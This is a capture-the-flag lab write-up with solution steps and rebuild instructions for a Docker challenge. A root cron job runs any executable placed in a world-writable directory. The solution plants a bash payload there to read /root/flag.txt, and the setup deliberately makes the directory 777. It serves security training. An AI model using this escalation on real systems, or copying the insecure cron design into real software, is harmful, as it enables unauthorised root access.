# Challenge 9 — Crontab Injection (Alpine)

## Description
Exploit a root cron job that blindly runs any executable dropped in **/var/cleanup**. Use it to read the protected flag at **/root/flag.txt**.

# Solution
1) Open a shell in the container.  
   `docker exec -it challenge9 bash`

2) Read the breadcrumb.  
   `cat /home/ctfuser/NOTICE.txt`

3) Confirm the schedule and the script.  
   `cat /etc/crontabs/root`  
   `cat /usr/local/bin/cleanup.sh`

4) Drop a payload into `/var/cleanup/` and make it executable.
   ```bash
   cat > /var/cleanup/pwn.sh <<'EOF'
   #!/usr/bin/env bash
   cat /root/flag.txt > /tmp/flag.out
   chmod 644 /tmp/flag.out
   EOF
   chmod +x /var/cleanup/pwn.sh
   ```

5) Wait up to one minute for cron to run. Optional: watch the log.  
   `tail -f /var/log/cleanup.log`

6) Read the flag.  
   `cat /tmp/flag.out`

Why this works: the cron job runs as root and executes anything in a world‑writable directory. Your payload reads the flag and drops it somewhere you can access.

# Recreating this challenge
Follow these steps to rebuild the challenge from scratch without using `build.sh`.

**1. Make a working folder.**  
Create `challenge9/app`. All files below go into the `app` folder.

**2. Create the flag.**  
Make a file named `flag.txt` with the contents: `flag{cron_cleanup_got_pwned}`.

**3. Write the vulnerable cleanup script.**  
Create `cleanup.sh` that:
- uses **bash** (`#!/usr/bin/env bash`),
- loops through every file under `/var/cleanup/`,
- if a file is **regular** and **executable**, runs it with `/bin/bash`,
- exits on errors (`set -euo pipefail`).  
Mark it executable (`chmod 755 cleanup.sh`).

**4. Add a breadcrumb for players.**  
Create `NOTICE.txt` explaining that a root cron task runs `/usr/local/bin/cleanup.sh` every minute and processes executables placed in `/var/cleanup/`. Mention the log at `/var/log/cleanup.log`.

**5. Write a Dockerfile (high level).**  
In the Dockerfile, do the following:
- Start from **Alpine 3.20**. Install **bash**.
- Create a non‑root user named **ctfuser** with `/bin/bash` as their shell.
- Copy `flag.txt` to `/root/flag.txt` and set its permission to **600**.
- Copy `cleanup.sh` to `/usr/local/bin/cleanup.sh` and make it **755**.
- Create the directories `/var/cleanup` and `/var/log`; set `/var/cleanup` to **777** so any user can drop files there.
- Copy `NOTICE.txt` to `/home/ctfuser/NOTICE.txt` and change ownership to `ctfuser`.
- Create the **root crontab** file at `/etc/crontabs/root` with one entry that runs
  `/bin/bash /usr/local/bin/cleanup.sh` **every minute**, appending output to `/var/log/cleanup.log`.
- For the container command, start BusyBox cron and keep the container alive. Important: run cron with the **correct spool directory**: `crond -c /etc/crontabs`. Keep it alive using a long‑running command (e.g., `tail -f /dev/null`).

**6. Build the image.**  
From the directory that contains the `app` folder, run:  
`docker build -t challenge9:latest app`

**7. Start the container (detached).**  
`docker run -d --name challenge9 challenge9:latest /bin/bash -lc "/usr/sbin/crond -l 8 -c /etc/crontabs; tail -f /dev/null"`

**8. Quick verification (optional).**  
- `docker exec challenge9 sh -lc 'cat /etc/crontabs/root'`  (see the cron line)  
- `docker exec challenge9 sh -lc 'ps | grep crond'`         (cron is running)  
- `docker exec challenge9 sh -lc 'ls -ld /var/cleanup'`     (directory is world‑writable)

At this point the challenge is ready for players to solve manually using the steps above.

---

**Validation:** `solve.sh` is for validation only. Players should solve it manually.
